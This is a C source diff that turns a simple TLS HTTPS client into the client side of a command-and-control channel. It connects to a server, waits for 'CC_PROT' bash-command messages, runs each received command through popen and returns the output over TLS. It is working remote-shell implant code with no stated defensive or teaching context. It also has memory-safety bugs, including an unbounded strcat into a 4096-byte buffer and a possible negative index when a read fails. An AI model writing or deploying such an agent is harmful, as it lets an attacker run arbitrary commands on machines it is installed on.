@@ -17,174 +17,168 @@
     abort();                                                                   \
   } while (0)
 
-#define USE_FUNCTIONS 0
+/**
+ * @brief Executes a command in a pseudo terminal and returns stdout result
+ *
+ * @param command
+ * @return char*
+ */
+char *execute_command(char *command) {
+	FILE *fp;
+	char *res = calloc(4096, sizeof(char));
+	char buf[1024];
 
-#if (USE_FUNCTIONS)
-int OpenConnection(const char *hostname, uint16_t port) {
-  int sd;
-  struct hostent *host;
-  struct sockaddr_in addr;
+	fp = popen(command, "r");
+	if (fp == NULL) {
+		perror("Failed to run command");
+		return NULL;
+	}
 
-  if ((host = gethostbyname(hostname)) == NULL) {
-    perror(hostname);
-    LOCAL_ABORT();
-  }
-  sd = socket(PF_INET, SOCK_STREAM, 0);
-  bzero(&addr, sizeof(addr));
-  addr.sin_family = AF_INET;
-  addr.sin_port = htons(port);
-  addr.sin_addr.s_addr = *(long *)(host->h_addr);
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		strcat(res, buf);
+	}
+	// printf("RESULT OF COMMAND: %s\n", res);
 
-  if (connect(sd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
-    close(sd);
-    perror(hostname);
-    fprintf(stderr, "Is the server running, and on the correct port (%d)?\n",
-            port);
-    LOCAL_ABORT();
-  }
-  return sd;
-}
+	pclose(fp);
+	return res;
+	}
 
-SSL_CTX *InitCTX(void) {
-  const SSL_METHOD *method;
-  SSL_CTX *ctx;
+int client_run(char *hostname, uint16_t portnum) {
+	SSL_CTX *ctx;
+	int server;
+	SSL *ssl;
+	static char buf[1024 * 1024];
+	int bytes;
 
-  OpenSSL_add_all_algorithms();     /* Load cryptos, et.al. */
-  SSL_load_error_strings();         /* Bring in and register error messages */
-  method = TLSv1_2_client_method(); /* Create new client-method instance */
-  ctx = SSL_CTX_new(method);        /* Create new context */
-  if (ctx == NULL) {
-    ERR_print_errors_fp(stderr);
-    LOCAL_ABORT();
-  }
-  return ctx;
-}
+	struct hostent *host;
+	struct sockaddr_in addr;
+	const SSL_METHOD *method;
 
-void ShowCerts(SSL *ssl) {
-  X509 *cert;
-  char *line;
-  cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
-  if (cert != NULL) {
-    printf("Server certificates:\n");
-    line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
-    printf("Subject: %s\n", line);
-    free(line); /* free the malloc'ed string */
-    line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
-    printf("Issuer: %s\n\n", line);
-    free(line);      /* free the malloc'ed string */
-    X509_free(cert); /* free the malloc'ed certificate copy */
-  } else {
-    printf("Info: No client certificates configured.\n");
-  }
-}
-#endif
+	// Initialize the SSL library
+	SSL_library_init();
 
-int client_run(char* hostname, uint16_t portnum) {
-  SSL_CTX *ctx;
-  int server;
-  SSL *ssl;
-  static char buf[1024 * 1024];
-  int bytes;
-#if (!(USE_FUNCTIONS))
-  struct hostent *host;
-  struct sockaddr_in addr;
-  const SSL_METHOD *method;
-#endif
+	OpenSSL_add_all_algorithms();     /* Load cryptos, et.al. */
+	SSL_load_error_strings();         /* Bring in and register error messages */
+	method = TLSv1_2_client_method(); /* Create new client-method instance */
+	ctx = SSL_CTX_new(method);        /* Create new context */
+	if (ctx == NULL) {
+		ERR_print_errors_fp(stderr);
+		LOCAL_ABORT();
+	}
 
-  // Initialize the SSL library
-  SSL_library_init();
+	if ((host = gethostbyname(hostname)) == NULL) {
+		perror(hostname);
+		LOCAL_ABORT();
+	}
+	server = socket(PF_INET, SOCK_STREAM, 0);
+	bzero(&addr, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(portnum);
+	addr.sin_addr.s_addr = *(long *)(host->h_addr);
 
-#if (USE_FUNCTIONS)
-  ctx = InitCTX();
-  server = OpenConnection(hostname, portnum);
-#else
-  OpenSSL_add_all_algorithms();     /* Load cryptos, et.al. */
-  SSL_load_error_strings();         /* Bring in and register error messages */
-  method = TLSv1_2_client_method(); /* Create new client-method instance */
-  ctx = SSL_CTX_new(method);        /* Create new context */
-  if (ctx == NULL) {
-    ERR_print_errors_fp(stderr);
-    LOCAL_ABORT();
-  }
+	int conn_tries = 3;
+	while (conn_tries >= 0) {
+		if (connect(server, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+		if (conn_tries > 1) {
+			conn_tries--;
+			printf("Failed to connect, trying again. Remaining tries: %i\n",
+				conn_tries);
+			sleep(1);
+			continue;
+		}
+		close(server);
+		perror(hostname);
+		fprintf(stderr, "Is the server running, and on the correct port (%d)?\n",
+				portnum);
+		LOCAL_ABORT();
+		} else {
+		// Connected
+		conn_tries = -1;
+		}
+	}
 
-  if ((host = gethostbyname(hostname)) == NULL) {
-    perror(hostname);
-    LOCAL_ABORT();
-  }
-  server = socket(PF_INET, SOCK_STREAM, 0);
-  bzero(&addr, sizeof(addr));
-  addr.sin_family = AF_INET;
-  addr.sin_port = htons(portnum);
-  addr.sin_addr.s_addr = *(long *)(host->h_addr);
+	ssl = SSL_new(ctx);      /* create new SSL connection state */
+	SSL_set_fd(ssl, server); /* attach the socket descriptor */
+	conn_tries = 3;
+	int connection_terminate = 0;
+	while (conn_tries > 0 && connection_terminate == 0) {
+		if (SSL_connect(ssl) <= 0) {
+			// Connection failed
+			conn_tries--;
+			printf("Failed to establish SSL connection, trying again. Remaining "
+					"tries: %i\n",
+					conn_tries);
+			ERR_print_errors_fp(stderr);
+			sleep(1);
+		} else {
+			// Connection success
+			X509 *cert;
+			char *line;
+			conn_tries = 0;
+			printf("\nConnected with %s encryption\n", SSL_get_cipher(ssl));
 
-  if (connect(server, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
-    close(server);
-    perror(hostname);
-    fprintf(stderr, "Is the server running, and on the correct port (%d)?\n",
-            portnum);
-    LOCAL_ABORT();
-  }
-#endif
+			cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
+			if (cert != NULL) {
+				printf("Server certificates:\n");
+				line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
+				printf("Subject: %s\n", line);
+				free(line);
+				line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
+				printf("Issuer: %s\n\n", line);
+				free(line);
+				X509_free(cert);
+			} else {
+				printf("Info: No client certificates configured.\n");
+			}
 
-  ssl = SSL_new(ctx);        /* create new SSL connection state */
-  SSL_set_fd(ssl, server);   /* attach the socket descriptor */
-  if (SSL_connect(ssl) <= 0) /* perform the connection */
-  {
-    ERR_print_errors_fp(stderr);
-  } else {
-#if (!(USE_FUNCTIONS))
-    X509 *cert;
-    char *line;
-#endif
-    char request[4096];
-    sprintf(request,
-            "GET / HTTP/1.1\r\n"
-            "User-Agent: Wget/1.17.1 (linux-gnu)\r\n"
-            "Accept: */*\r\n"
-            "Accept-Encoding: identity\r\n"
-            "Host: %s:%d\r\n"
-            //             "Connection: Keep-Alive\n"
-            "\r\n",
-            hostname, portnum);
+			while(connection_terminate == 0){
 
-    printf("Sending:\n[%s]\n", request);
+				bytes = SSL_read(ssl, buf, sizeof(buf)); // Get request
+				buf[bytes] = '\0';
 
-    printf("\n\nConnected with %s encryption\n", SSL_get_cipher(ssl));
+				printf("Raw server msg:\n[%s]\n", buf);
 
-#if (USE_FUNCTIONS)
-    ShowCerts(ssl); /* get any certs */
-#else
-    cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
-    if (cert != NULL) {
-      printf("Server certificates:\n");
-      line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
-      printf("Subject: %s\n", line);
-      free(line); /* free the malloc'ed string */
-      line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
-      printf("Issuer: %s\n\n", line);
-      free(line);      /* free the malloc'ed string */
-      X509_free(cert); /* free the malloc'ed certificate copy */
-    } else {
-      printf("Info: No client certificates configured.\n");
-    }
-#endif
+				// If valid message in protocol, we proceed to parse it
+				if (strncmp(buf, CC_PROT_BASH_COMMAND_REQUEST, strlen(CC_PROT_BASH_COMMAND_REQUEST)) == 0) {
+					if (bytes > 0) {
+						// printf("Reply with:\n[%s]\n", response);
+						char *p;
+						p = strtok(buf, "#");
+						p = strtok(NULL, "#");
+						if (p) {
+							char *res = execute_command(p);
+							char *response = calloc(4096, sizeof(char));
+							if(res==NULL){
+								strcpy(response, CC_PROT_ERR);
+							}else{
+								strcpy(response, CC_PROT_BASH_COMMAND_RESPONSE);
+								strcat(response, res);
+							}
+							printf("Answering: \n%s\n", response);
+							SSL_write(ssl, response, strlen(response));
+							free(response);
+						} else {
+							printf("Could not parse message correctly, ignoring\n");
+						}
+					} else {
+						ERR_print_errors_fp(stderr);
+					}
+				}else if (strncmp(buf, CC_PROT_FIN, strlen(CC_PROT_FIN)) == 0) { 
+					printf("Server requested to stop the connection\n");
+					connection_terminate = 1;
+				}else {
+					//If at this point, then we failed to identify the server message
+					printf("Message not recognizable: %s\n", buf);
+					char *response = CC_PROT_ERR;
+					SSL_write(ssl, response, strlen(response));
+				}
+			}
 
-    SSL_write(ssl, request, strlen(request)); /* encrypt & send message */
+		}
+	}
+	printf("SSL client closed\n");
+	close(server);     /* close socket */
+	SSL_CTX_free(ctx); /* release context */
 
-    bytes = SSL_read(ssl, buf, sizeof(buf)); /* get reply & decrypt */
-    buf[bytes] = 0;
-    printf("Received (%d bytes):\n[%s]\n", bytes, buf);
-
-    // second send.. - for my real web page, it comes in two parts.
-    // bytes = SSL_read (ssl, buf, sizeof (buf)); /* get reply & decrypt */
-    // buf[bytes] = 0;
-    // printf ("Received (%d bytes):\n[%s]\n", bytes, buf);
-
-    SSL_free(ssl); /* release connection state */
-  }
-
-  close(server);     /* close socket */
-  SSL_CTX_free(ctx); /* release context */
-
-  return 0;
+	return 0;
 }
